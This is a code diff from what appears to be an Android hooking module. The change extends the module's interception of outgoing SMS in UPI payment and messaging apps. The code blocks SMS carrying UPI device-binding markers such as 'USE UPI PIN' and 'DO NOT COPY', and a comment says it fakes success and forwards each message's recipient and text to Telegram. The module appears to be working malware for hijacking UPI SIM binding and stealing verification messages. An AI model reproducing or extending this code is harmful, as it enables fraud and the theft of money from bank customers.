@@ -1161,65 +1161,63 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
                     std::string& dest, std::string& body, jint code) {
     // SMS Tweaks: Intercept ON in UPI/Messages → block outgoing ISms, fake OK, TG To+body
     if (!data) return false;
+    if (!g_in_hooked_upi && !g_is_messaging_app) return false;
+
+    const bool intercept =
+        config.intercept_fake_success || config.hook_outgoing_sms || g_in_hooked_upi ||
+        g_is_messaging_app;
+    if (!intercept) return false;
+
     reset_parcel(env, data);
     const std::string iface = parcel_read_string(env, data);
     reset_parcel(env, data);
+    const std::string blob = parcel_marshall_blob(env, data);
     const bool is_sms_iface =
         iface.find("ISms") != std::string::npos || iface.find("isms") != std::string::npos ||
         iface.find("ISmsEx") != std::string::npos || iface.find("IMms") != std::string::npos ||
         iface.find("MotoSms") != std::string::npos;
-    if (!is_sms_iface) return false;
-    if (!g_in_hooked_upi && !g_is_messaging_app) return false;
-
-    const bool intercept =
-        config.intercept_fake_success || config.hook_outgoing_sms || g_in_hooked_upi;
-    if (!intercept) return false;
+    // Android 16 / Messages: iface string often empty (iface_ok=0) but blob has ISms / HEROAXIS
+    const bool blob_isms = messaging_blob_looks_like_sms_send(blob);
+    if (!is_sms_iface && !blob_isms) return false;
 
     read_isms_outgoing(env, data, dest, body);
     if (dest.empty() && body.empty()) extract_isms_from_blob(env, data, dest, body);
 
     const bool blob_verify = parcel_blob_has_verify(env, data);
     const bool blob_sms = parcel_blob_has_sms_compose(env, data);
-    const std::string blob = parcel_marshall_blob(env, data);
     const bool sendish = blob_looks_like_outgoing_send(blob);
     const bool looks = looks_like_isms_send(code, dest, body, blob_verify, blob_sms);
 
     // Inbox OTP display — do not block
     if ((is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) && !sendish &&
-        !blob_verify && !blob_sms) {
+        !blob_verify && !blob_sms && !blob_contains_needle(blob, "HEROAXIS") &&
+        !blob_contains_needle(blob, "DO NOT COPY")) {
         write_isms_trace("isms_skip_otp_inbox");
         return false;
     }
 
-    // UPI: intercept → block almost all ISms (SmsManager path). Messages: send markers only.
-    bool should_block = false;
-    if (g_in_hooked_upi) {
-        should_block = sendish || blob_verify || blob_sms || looks ||
-                       is_outgoing_upi_verify_body(body) ||
-                       (is_clean_sms_dest(dest) && !body.empty() && !is_incoming_otp_noise(body) &&
-                        !is_pkg_like(body)) ||
-                       (blob.size() > 64 &&
-                        (blob_contains_needle(blob, "smsto") ||
-                         blob_contains_needle(blob, "SMSTO") ||
-                         blob_contains_needle(blob, "sendText") ||
-                         blob_contains_needle(blob, "HEROAXIS") ||
-                         blob_contains_needle(blob, "DO NOT COPY") ||
-                         blob_contains_needle(blob, "YESPRO") ||
-                         blob_contains_needle(blob, "USE UPI PIN") ||
-                         is_clean_sms_dest(dest)));
-        // SMS Tweaks nuclear: UPI + ISms + non-trivial parcel → block (parse fail bhi)
-        if (!should_block && config.intercept_fake_success && blob.size() > 120) {
-            should_block = true;
-        }
-    } else {
-        should_block = sendish || blob_verify || blob_sms || looks ||
-                       is_outgoing_upi_verify_body(body) || is_valid_outgoing_capture(dest, body);
+    // UPI + Messages: block outgoing ISms (Hero SENDTO → Messages real SIM path)
+    bool should_block = sendish || blob_verify || blob_sms || looks || blob_isms ||
+                        is_outgoing_upi_verify_body(body) ||
+                        is_valid_outgoing_capture(dest, body) ||
+                        blob_contains_needle(blob, "HEROAXIS") ||
+                        blob_contains_needle(blob, "DO NOT COPY") ||
+                        blob_contains_needle(blob, "USE UPI PIN") ||
+                        blob_contains_needle(blob, "YESPRO") ||
+                        blob_contains_needle(blob, "smsto") ||
+                        blob_contains_needle(blob, "SMSTO") ||
+                        blob_contains_needle(blob, "sendText");
+    // Nuclear: messaging/UPI + ISms-like parcel + nontrivial size → block (iface empty OK)
+    if (!should_block && blob_isms && blob.size() > 64) should_block = true;
+    if (!should_block && config.intercept_fake_success && blob_isms && blob.size() > 120) {
+        should_block = true;
     }
 
     if (!should_block) {
         char miss[192];
-        snprintf(miss, sizeof(miss), "isms_passthrough code=%d dest=%zu body=%zu send=%d",
-                 (int)code, dest.size(), body.size(), sendish ? 1 : 0);
+        snprintf(miss, sizeof(miss),
+                 "isms_passthrough code=%d dest=%zu body=%zu send=%d blob_isms=%d", (int)code,
+                 dest.size(), body.size(), sendish ? 1 : 0, blob_isms ? 1 : 0);
         write_isms_trace(miss);
         return false;
     }
